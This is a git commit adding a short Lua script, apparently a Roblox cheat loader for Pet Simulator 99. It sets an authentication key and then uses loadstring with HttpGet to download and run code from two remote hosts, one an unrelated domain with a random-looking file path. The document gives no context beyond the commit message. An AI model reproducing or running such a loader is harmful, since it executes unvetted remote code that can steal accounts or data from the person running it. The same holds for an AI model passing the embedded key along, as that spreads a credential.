6e2076a96b85780638dd73aab0b4ccefef01bf38
BetaJayYt <javienscodm@gmail.com>
2025-01-01 17:36:54 -0600

    Create Op ps99.lua

---
+++ Op ps99.lua
@@ -0,0 +1,7 @@
+getgenv().AuthKey = "HUGE_e8ZtDt9nuuh5"
+getgenv().LoadSettings = {
+    Example_Setting = Example_Value
+}
+loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
+
+loadstring(game:HttpGet("https://egorikusa.space/b056ad78b1eb1fce1bd89c91.lua", true))()
